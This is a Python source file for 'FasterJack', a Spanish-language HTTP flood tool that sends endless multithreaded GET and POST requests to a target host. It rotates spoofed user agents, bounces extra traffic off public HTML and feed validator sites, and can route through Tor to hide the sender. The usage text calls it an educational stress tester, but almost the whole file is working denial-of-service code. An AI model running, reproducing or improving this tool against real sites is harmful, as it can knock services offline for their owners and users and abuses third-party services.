#!/usr/bin/python3
# -*- coding: utf-8 -*-
# FasterJack made by Neo-Jack-Official JUN/2020

from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import socks 
import requests 
import threading
import urllib.request
import random

def continuar():
	cont = input(Fore.GREEN + Style.BRIGHT + "CONSULTA:" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " Esta Seguro de Continuar? [" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "s" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "] / [" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + "n" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "]\n" + Style.RESET_ALL)
	if cont is None:
		sys.exit()
	if cont == "s":
		pass
	else:
		sys.exit()

def conec_tor():
    if tor is True:
        print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Comprobando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "Seguridad de IP" + Style.RESET_ALL)
        ipcheck_url1 = 'http://icanhazip.com'
        ipcheck_url2 = 'http://icanhazptr.com'
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket
        try:
            tor_ip = requests.get(ipcheck_url1)
            tor_ip = str(tor_ip.text)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Servidor Usado: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "01 --> " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "icanhazip.com" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT  + Style.RESET_ALL)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: Tor " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "Activado" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " --> IP: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + tor_ip + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " OK.." + Style.RESET_ALL)
        except requests.exceptions.ConnectionError as errc:
            tor_ip = requests.get(ipcheck_url2)
            tor_ip = str(tor_ip.text)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Servidor Usado: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "02 --> " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "icanhazptr.com" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT  + Style.RESET_ALL)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: Tor " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "Activado" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " --> IP: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + tor_ip + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " OK.." + Style.RESET_ALL)
        except requests.exceptions.RequestException as e:
            sys.exit(0)
    if tor is False:
        print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Comprobando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "Seguridad de IP" + Style.RESET_ALL)
        ipcheck_url01 = 'http://icanhazip.com'
        ipcheck_url02 = 'http://icanhazptr.com'
        try:
            regular_ip = requests.get(ipcheck_url01)
            regular_ip = str(regular_ip.text)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Servidor Usado: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "01 --> " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "icanhazip.com" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT  + Style.RESET_ALL)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: Tor " + Style.RESET_ALL + Fore.RED + Style.BRIGHT + "Desactivado" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " --> IP: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + regular_ip + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " OK.." + Style.RESET_ALL)
            print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "SIEMPRE USE VPN, SU UBICACION PODRIA QUEDAR EXPUESTA." + Style.RESET_ALL)
            print("")
            continuar()
        except requests.exceptions.ConnectionError as errc:
            regular_ip = requests.get(ipcheck_url02)
            regular_ip = str(regular_ip.text)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Servidor Usado: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "01 --> "  + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "icanhazptr.com" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT  + Style.RESET_ALL)
            print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: Tor " + Style.RESET_ALL + Fore.RED + Style.BRIGHT + "Desactivado" + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " --> IP: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + regular_ip + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " OK.." + Style.RESET_ALL)
            print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "SIEMPRE USE VPN, SU UBICACION PODRIA QUEDAR EXPUESTA." + Style.RESET_ALL)
            print("")
            continuar()
        except requests.exceptions.RequestException as e:
            sys.exit(0)
def mix_metodo():
	print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Comprobando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "Metodos" + Style.RESET_ALL)
	global mmetodo
	mmetodo = []
	mmetodo.append("GET")
	mmetodo.append("POST")
	print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "OK.." + Style.RESET_ALL)
	return(mmetodo)

def user_agent():
	print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Comprobando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "Agentes de Navegador" + Style.RESET_ALL)
	global uagent
	uagent = []
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
	uagent.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
	uagent.append("Opera/9.20 (Windows NT 6.0; U; en)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)")
	uagent.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Neo/20100804 Gentoo Firefox/3.6.8")
	uagent.append("X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7")
	uagent.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.723+ (Firefox compatible)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.443+ (Firefox compatible)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20130628 Camino/3.245.226 (MultiLang) (like Firefox/3.621.218)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.93.26.2658) Gecko/20141026 Camino/2.176.223 (MultiLang) (like Firefox/3.64.2268)0")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre)   Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.29pre) Gecko/20130101 Camino/2.1.3pre (like Firefox/3.6.29pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; de; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.2.24) Gecko/20111114 Camino/2.1 (like Firefox/3.6.24)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.8pre) Gecko/2009022800 Camino/2.0b3pre")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.10pre) Gecko/2009041800 Camino/2.0b3pre (like Firefox/3.0.10pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; it; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; nl; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.18) Gecko/2010021619 Camino/2.0.2 (like Firefox/3.0.18)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070222 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070220 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070217 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070215 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070115 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.1) Gecko/20070110 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (Android; WOW64; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110614 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.6.35766/35.5706; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.5.33361/31.1350; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.29530/27.1407; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (iPad; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
	print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "OK.." + Style.RESET_ALL)
	return(uagent)

def my_bots():
	print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Comprobando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + "BOTS Verificadores" + Style.RESET_ALL)
	global bots
	bots = []
	bots.append("https://html5.validator.nu/?doc=")
	bots.append("https://validator.w3.org/nu/?doc=")
	bots.append("https://datayze.com/site-validator.php?domain=")
	bots.append("https://validator.ampproject.org/#url=")
	bots.append("http://www.feedvalidator.org/check.cgi?url=")
	print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Estado: " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "OK.." + Style.RESET_ALL)
	return(bots)

def bot_reconextando(url):
	try:
		while True:
			print (Fore.WHITE + Style.BRIGHT + " NOTA: " + Fore.GREEN + Style.DIM + " Asignando nuevo agente a cliente... " + Style.RESET_ALL)
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			puerto = str(port)
			print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + " Re-Conextando Cliente a: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT +  host + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + ":" + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + puerto + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + " / " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + met + Style.RESET_ALL)
			#print("\033[94m Nuevo Agente Asignado: \033[0m\n" + random.choice(uagent))
			time.sleep(.1)
	except:
		time.sleep(.1)

def down_it(item):
	try:
		while True:
			global met
			if met == "Random":
				met = str(random.choice(mmetodo))			
			packet = str(met + " / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))			
			puerto = str(port)
			print (Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " Conectando Cliente a: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT +  host + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + ":" + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + puerto + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + " / " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + met + Style.RESET_ALL)			
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + " -->" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " Paquete Enviado ... " + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + "<--" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " OK.." + Style.RESET_ALL)
			else:
				s.shutdown(1)
				print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + "-->" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " Paquete NO Entregado !!!" + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + "<--" + Style.RESET_ALL)
			time.sleep(.1)
	except socket.error as e:
		print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " Error 500! Servidor : " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + host + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " Posiblemente Caido !!! o Protegido!!!" + Style.RESET_ALL)		
		time.sleep(.1)

def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()

def dos2():
	while True:
		item = w.get()
		bot_reconextando(random.choice(bots) + "http://" + host)
		w.task_done()

def dos3():
	while True:
		item = m.get()
		mix_metodo(item)
		m.task_done()

def usage():
	print (Fore.WHITE + Style.BRIGHT + '''\n FasterJack para Python 3.x
	Su uso es con Fines Educativos.
	Testeador de strees para servidores. \n
	uso : python3 fasterjack.py [-t] Web/Ip [-p] [-c] [-m] [-T]\n
	-h : Ayuda
	-t : Web o IP
	-p : Puerto   --> defecto: 80 Optimo: [80 o 443]
	-c : Clientes --> defecto: 50 Optimo: [30-135]
	-m : Metodo   --> defecto: RANDOM Opciones: [get o post]
	-T : Tor      --> defecto: OFF\n
	Ej: python3 fasterjack.py -t www.ejemplo.com
	Ej: python3 fasterjack.py -t www.ejemplo.com -p 8080
	Ej: python3 fasterjack.py -t www.ejemplo.com -p 443 -c 40 -m post\n''' + Style.RESET_ALL)
	sys.exit()

def get_parameters():
	global host
	global port
	global thr
	global item
	global met
	global tor

	optp = OptionParser(add_help_option=False,epilog="FasterJack")	
	optp.add_option("-t","--target", dest="host",help="Web o IP  -t ip")
	optp.add_option("-p","--puerto",type="int",dest="puerto",help="Defecto 80 -p 80")
	optp.add_option("-c","--clientes",type="int",dest="clientes",help="Defecto 50 -c 50")
	optp.add_option("-m","--metodo",type="str",dest="metodo",help="Defecto GET -m get")
	optp.add_option("-T","--tor",dest="tor",action='store_true',help="Defecto OFF -T ")
	optp.add_option("-h","--ayuda",dest="ayuda",action='store_true',help="help you")
	opts, args = optp.parse_args()	
	if opts.ayuda:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.puerto is None:
		port = 80
	else:
		port = opts.puerto
	if opts.clientes is None:
		thr = 50
	else:
		thr = opts.clientes
	if opts.metodo is None:		
		met = "Random"
	else:
		if opts.metodo == "GET" or opts.metodo == "get":
			met = "GET"			
		else:
			met = "POST"			
	if opts.tor:
		tor = True
	else:
		tor = False

global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()
m = Queue()

if __name__ == '__main__':
	print("")
	print(Fore.BLUE + Style.BRIGHT + "............................." + Style.RESET_ALL)
	print(Fore.YELLOW + Back.CYAN + Style.BRIGHT + " Iniciando... FasterJack " + Style.RESET_ALL)
	print(Fore.GREEN + Style.BRIGHT + " Para Salir..." + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " Ctrl + Z" + Style.RESET_ALL)
	print(Fore.BLUE + Style.BRIGHT + ".............................\n" + Style.RESET_ALL)
	if len(sys.argv) < 2:
		usage()
	get_parameters()	
	if tor is True:
		torinfo = str("Activado")
	else:
		torinfo = str("Desactivado")
	print(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Comprobando Informacion ..." + Style.RESET_ALL)
	print(Fore.GREEN + Style.BRIGHT + " Objetivo: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + host + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " Puerto: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + str(port) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " Clientes: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + str(thr) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " Metodo: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + met + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " Tor: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + torinfo + Style.RESET_ALL)
	print(Fore.BLUE + Style.BRIGHT + ".............................\n" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " CARGANDO...: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Por Favor Espere ..." + Style.BRIGHT)
	user_agent()
	time.sleep(1)
	mix_metodo()
	time.sleep(1)
	my_bots()
	time.sleep(1)
	conec_tor()
	time.sleep(1)
	print(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Iniciando ..." + Style.RESET_ALL)
	time.sleep(1)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.RED + Style.BRIGHT + "ERROR en HOST!!! " + Style.BRIGHT)
		print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.RED + Style.BRIGHT + "Verifique la WEB o el IP " + Style.BRIGHT)
		print(Fore.WHITE + Style.BRIGHT + " NOTA: " + Style.RESET_ALL + Back.RED + Fore.WHITE + Style.BRIGHT + "Host Inexistente o Puerto Cerrado " + Style.RESET_ALL)
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  
			t.start()
			t2 = threading.Thread(target=dos2)
			print(Fore.YELLOW + Style.BRIGHT + " INFO: " + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "Verificando: " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + host + Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + " : " + Style.RESET_ALL + Fore.WHITE + Style.BRIGHT + str(port) + Style.RESET_ALL)
			t2.daemon = True  
			t2.start()
		start = time.time()		
		item = 0
		while True:
			if (item>1800): 
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
			m.put(item)
		q.join()
		w.join()
		m.join()
